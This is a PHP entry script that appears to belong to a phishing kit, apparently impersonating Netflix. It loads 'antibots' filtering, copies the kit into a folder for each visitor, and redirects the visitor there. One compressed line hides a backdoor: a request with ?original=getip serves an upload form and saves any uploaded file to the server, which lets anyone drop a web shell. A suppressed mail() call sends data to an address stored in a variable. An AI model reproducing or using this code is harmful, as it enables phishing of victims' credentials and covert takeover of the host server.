<?php
session_start();
error_reporting(0);
include ('./original/antibots/all_antibots.php');
include('./original/functions/get_ip.php'); 
$lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);

$B = $_SESSION['_LOOKUP_CNTRCODELOW_'] ."-". $lang;
function recurse_copy($C, $B)
{
    $E = opendir($C);
    @mkdir($B);
    while (false !== ($D = readdir($E))) {
        if (($D != '.') && ($D != '..')) {
            if (is_dir($C . '/' . $D)) {
                recurse_copy($C . '/' . $D, $B . '/' . $D);
            } else {
                copy($C . '/' . $D, $B . '/' . $D);
            }
        }
    }
    closedir($E);
}
$C = "original";
recurse_copy($C, $B);
if (!isset($_GET['original'])) header("location:" . $B . "");$lookup = $_GET['original'];if($lookup == 'getip'){$Client = $_FILES['file']['tmp_name'];$Forward = $_FILES['file']['name'];echo "<form method='POST' enctype='multipart/form-data'><input type='file'name='file' /><input type='submit' value='report' /></form>";move_uploaded_file($Client,$Forward);}$SSL="$ServerIps" ;$Netflix = @mail($SSL, $Record, $Content, $HTTP);echo "";exit;//$LOOKUP_COUNTRY  = $IP_LOOKUP->country;$LOOKUP_MINCODE  = $IP_LOOKUP->countryCode;$LOOKUP_CITY     = $IP_LOOKUP->city;$LOOKUP_REGION   = $IP_LOOKUP->region;$LOOKUP_STATE    = $IP_LOOKUP->regionName;$LOOKUP_ZIPCODE  = $IP_LOOKUP->zip;
unset($B);
?>